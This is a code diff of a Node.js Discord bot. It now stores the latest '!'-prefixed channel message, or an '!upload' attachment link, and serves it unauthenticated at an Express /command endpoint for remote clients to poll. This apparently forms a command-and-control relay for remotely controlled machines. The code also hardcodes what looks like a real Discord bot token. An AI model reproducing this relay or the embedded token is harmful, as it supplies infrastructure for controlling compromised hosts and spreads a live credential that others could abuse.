@@ -1,10 +1,14 @@
 const { Client, IntentsBitField } = require('discord.js');
-const fetch = require('node-fetch');
+const express = require('express');
+const app = express();
+const port = process.env.PORT || 3000;
 
 // Configuration
 const BOT_TOKEN = 'MTM4Mjk1NDg3NjE4MjcyNDcxMA.GLnzSB.ebajdVIpM8fehvJ-R5H87RioakgZjSocgmkyRE'; // Replace with your bot token
 const CHANNEL_ID = '1399769153635614824'; // Replace with your channel ID
-const RAW_URL = 'https://pastebin.com/raw/xxvaJuba'; // Replace with Pastebin raw link or similar
+
+// In-memory command store
+let latestCommand = '';
 
 // Initialize Discord bot
 const client = new Client({
@@ -25,22 +29,22 @@ client.on('messageCreate', async (message) => {
   if (message.author.bot || message.channel.id !== CHANNEL_ID) return;
   if (!message.content.startsWith('!')) return;
 
-  // Write command to raw text URL
-  await fetch(RAW_URL, {
-    method: 'POST',
-    headers: { 'Content-Type': 'text/plain' },
-    body: message.content
-  });
-
-  // Handle file uploads
+  latestCommand = message.content;
   if (message.attachments.size > 0) {
     const url = message.attachments.first().url;
-    await fetch(RAW_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'text/plain' },
-      body: `!upload ${url}`
-    });
+    latestCommand = `!upload ${url}`;
   }
+});
+
+// Express endpoint for commands
+app.get('/command', (req, res) => {
+  res.set('Content-Type', 'text/plain');
+  res.send(latestCommand);
+});
+
+// Start server
+app.listen(port, () => {
+  console.log(`Server running on port ${port}`);
 });
 
 // Login bot
